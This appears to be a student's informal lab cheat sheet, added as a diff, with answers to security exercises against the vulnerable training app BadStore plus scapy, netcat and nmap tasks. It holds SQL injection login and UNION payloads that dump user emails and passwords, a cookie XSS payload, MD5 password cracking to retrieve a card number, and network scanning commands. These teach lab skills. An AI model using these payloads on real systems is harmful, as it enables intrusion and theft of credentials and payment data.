@@ -1,0 +1,211 @@
+5A)
+.open badstore run ifconfig copy ifconfig ip
+.login as admin' -- ,add cart value in whats new update cart
+. in search right click select inspection clear maxlength
+. seach  <script>alert(document.cookie)</script>
+.copy the cartid value search url decrypter paste and decrypt
+trhe decrypted value is answer and in that the 3rd field is the main answer
+
+5B)
+>>>sudo scapy
+>>>myframe=Ether()/IP()
+>>> myframe.show()
+>>>myframe.summary()
+
+5C)
+.create a file using >>gedit plain.sh
+. write script
+#!/bin/bash
+host="www.example.com" 
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+.>> chmod +x plain.sh
+>> ./plain.sh
+.enter starting port number: 80
+enter ending port number: 85
+
+6A)
+.login as admin -- 
+.in url change action=admin, select show current user ,do it
+.copy joe@supplier password then paste it in md5 decrypter you get the password iforgot 
+.login as joe@supplier.com -- or id password
+.view previous order 
+and fetch the card number for the price $46.95
+
+6B)
+.run >>ping google.com in 2nd terminal then do the steps
+>>>from scapy.all import *
+>>> packets=sniff(count=10)
+>>> packets.summary()
+
+6C)
+>>nc -vlp 1234 (one terminal)
+>>nc localhost 1234(2nd terminal)
+
+7A)
+>>> from scapy.all import *
+>>> result, _ = traceroute(["www.example.com", "www.google.com"], maxttl=20)
+>>> result.show()
+7B)
+nc example.com 80
+HEAD / HTTP/1.1
+HOST: example.com
+
+nc example.com 80
+GET / HTTP/1.1
+HOST: example.com
+
+7C)
+nmap -sn 192.168.56.1
+nmap 192.168.56.1
+
+8A)  
+. ip addr runthis on one terminal then copy the ip which have /24 at end ,then open 2nd terminal and run the command  and replace ip address in third command
+>>>import scapy.all as scapy
+>>> request = scapy.ARP()
+>>> request.pdst='192.168.1.0/24'
+>>> broadcast = scapy.Ether()
+>>> broadcast.dst = 'ff:ff:ff:ff:ff:ff'
+>>> request_broadcast = broadcast / request
+>>> clients = scapy.srp(request_broadcast, timeout = 1)[0]
+>>>>>> for element in clients:
+...:     print(element[1].psrc + " " + element[1].hwsrc)
+
+8B)
+.nc -l -p 5000
+.go to browser firefox and search -> localhost:5000 , come back to terminal and write
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+server: nooblinux
+
+<!doctype html>
+<title>bnm</title>
+<h1>cars</h1>
+
+>got to local host you can see the msg
+
+8C)
+>>nmap 192.168.56.100-120
+>>nmap 192.168.56.0/24
+
+9A)  do same done in 5A) answer is cart_id
+
+9B) do same done in 5C)
+
+9C) 
+>>nmap 192.168.56.1
+>>nmap -sV 192.168.56.1
+
+10A) do same done in 5A)  answer cart_id
+10B)
+>>nmap -O 192.168.56.1
+>>nmap -A 192.168.56.1
+
+10C)
+.login as admin
+.change url action = admin
+.select new usser doit
+.right click view page source , clich ctrl+f;search headen find headen
+
+11A)
+>>> from scapy.all import *
+>>> packet = IP(dst="8.8.8.8")/ICMP()
+..open wire shark start then come to terminal write the code
+>>> send(packet)
+.go back to wirw shark stop the wireshark give filter icmp 
+
+11B)
+go to browser and open wikipdedia image in new tab and copyimage link
+open terminal
+>> nc -l -p 5000
+go to browser firefox and search -> localhost:5000come back to terminal
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+server: nooblinux
+
+<!doctype html>
+<title>bnm</title>
+<h1>cars</h1>
+<img src="image.jpg" alt="sample" width="300" height="200">
+
+11C)
+.login as admin
+.in search baar write x
+the write >>x'union select itemnum, sdesc, ldesc, price from itemdb --    click one space
+again write  >> x'union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from itemdb --          again click one space
+.16 is the answer
+
+12A)
+>>> from scapy.all import *
+>>> target_ip = "www.example.com"
+>>>ports= [22,80,443]
+>>> for port in ports:
+...:     packet = IP(dst=target_ip) / TCP(dport=port,flags="S")
+...:     response = sr1(packet,timeout=1,verbose=0)
+...:     if response:
+...:         if response[TCP].flags =="SA":
+...:             print(f"PORT {port} is open.")
+...:         elif response[TCP].flags == "RA":
+...:             print(f"Port {port} is closed.")
+
+12B)
+>>nmap --script vuln google.com
+>>nmap --script vuln 192.168.56.1
+>>nmap -oN output.txt --script vuln 192.168.56.1
+.then go to folder c, program_file(x68) , nmap , output.txt
+
+12C)
+. find joe@supplier password
+.come back in badstore -> click supplier login
+name : joe@supplier.com
+password : iforgot ( or which on u got in the MD5)
+show the answer of upload price list
+
+13A)  same  11B)
+
+13B)
+>>nmap 192.168.56.100-120
+>>nmap 192.168.56.0/24
+
+13C) same as  6A)
+
+14A)
+.run ping command in terminal 
+>>> from scapy.all import *
+def packet_calback(packet):
+...:     if packet[IP].proto==1:
+...:         print(f"ICMP packet from {packet[IP].src}")
+...: sniff(prn=packet_calback, filter="icmp",store=0)
+
+14B)  same 9C)
+
+14C)
+.login as admin change in url action =admin 
+.select current user doit 
+.click ctrl+f search whole.biz enter you get two names  answer
+
+15A) do same as 8A)
+
+15B) same as 11B)
+
+15C)
+.do same as done in 1 only change instead of selecting the cart_id here select ssoid and do same then decrypt using cyberchef
+
+16A) do same as 7A)
+
+16B)   same 11B)
+
+12C)  do same done in 5A)  answer cart_id
+
+
+https://github.com/1R5HAD/crypto
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 --
+
+>>> wrpcap("cap1.pcap",myframe)
